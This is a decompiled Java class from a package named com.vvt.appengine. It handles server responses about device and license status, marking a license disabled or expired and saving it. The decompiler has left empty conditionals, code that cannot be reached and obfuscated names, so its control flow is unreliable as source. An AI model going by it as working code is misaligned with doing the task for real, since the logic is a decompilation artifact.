package com.vvt.appengine;

import com.vvt.datadeliverymanager.a.d;
import com.vvt.datadeliverymanager.enums.ServerStatusType;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.license.exception.LicenseException;

class y
  implements d
{
  private static final boolean a = com.vvt.ak.a.b;
  private static final boolean b = com.vvt.ak.a.e;
  private AppEngine1 c;
  
  y(AppEngine1 paramh)
  {
    this.c = paramh;
  }
  
  public void a(ServerStatusType paramServerStatusType)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = ServerStatusType.SERVER_STATUS_ERROR_DEVICE_ID_NOT_FOUND;
    Object localObject3;
    if (paramServerStatusType != localObject1)
    {
      localObject1 = ServerStatusType.SERVER_STATUS_ERROR_LICENSE_NOT_FOUND;
      if (paramServerStatusType != localObject1) {}
    }
    else
    {
      bool1 = a;
      if (bool1) {}
      localObject1 = this.c.k.a().getLicenseStatus();
      localObject3 = LicenseStatus.NOT_ACTIVATED;
      if (localObject1 != localObject3)
      {
        localObject1 = this.c.k;
        ((com.vvt.license.b)localObject1).b();
      }
    }
    for (;;)
    {
      return;
      localObject1 = ServerStatusType.SERVER_STATUS_ERROR_LICENSE_ALREADY_IN_USE;
      if (paramServerStatusType != localObject1)
      {
        localObject1 = ServerStatusType.SERVER_STATUS_ERROR_LICENSE_COURRUPT;
        if (paramServerStatusType != localObject1)
        {
          localObject1 = ServerStatusType.SERVER_STATUS_ERROR_LICENSE_DISABLED;
          Object localObject4;
          Object localObject5;
          boolean bool2;
          if (paramServerStatusType == localObject1)
          {
            bool1 = a;
            if (bool1) {}
            localObject1 = this.c.k.a();
            localObject3 = LicenseStatus.DISABLED;
            ((LicenseInfo)localObject1).setLicenseStatus((LicenseStatus)localObject3);
            try
            {
              localObject3 = this.c;
              localObject3 = ((AppEngine1)localObject3).k;
              localObject4 = this.c;
              localObject4 = ((AppEngine1)localObject4).o;
              localObject5 = this.c;
              localObject5 = ((AppEngine1)localObject5).l;
              localObject5 = ((com.vvt.phoneinfo.b)localObject5).d();
              bool2 = true;
              ((com.vvt.license.b)localObject3).a((LicenseInfo)localObject1, (com.vvt.productinfo.a)localObject4, (String)localObject5, bool2);
            }
            catch (LicenseException localLicenseException)
            {
              bool1 = b;
            }
            if (!bool1) {}
          }
          else
          {
            Object localObject2 = ServerStatusType.SERVER_STATUS_ERROR_LICENSE_EXPIRED;
            if (paramServerStatusType == localObject2)
            {
              bool1 = a;
              if (bool1) {}
              localObject2 = this.c.k.a();
              localObject3 = LicenseStatus.EXPIRED;
              ((LicenseInfo)localObject2).setLicenseStatus((LicenseStatus)localObject3);
              try
              {
                localObject3 = this.c;
                localObject3 = ((AppEngine1)localObject3).k;
                localObject4 = this.c;
                localObject4 = ((AppEngine1)localObject4).o;
                localObject5 = this.c;
                localObject5 = ((AppEngine1)localObject5).l;
                localObject5 = ((com.vvt.phoneinfo.b)localObject5).d();
                bool2 = true;
                ((com.vvt.license.b)localObject3).a((LicenseInfo)localObject2, (com.vvt.productinfo.a)localObject4, (String)localObject5, bool2);
              }
              catch (Exception localException)
              {
                bool1 = b;
              }
              if (!bool1) {}
            }
          }
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/y.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */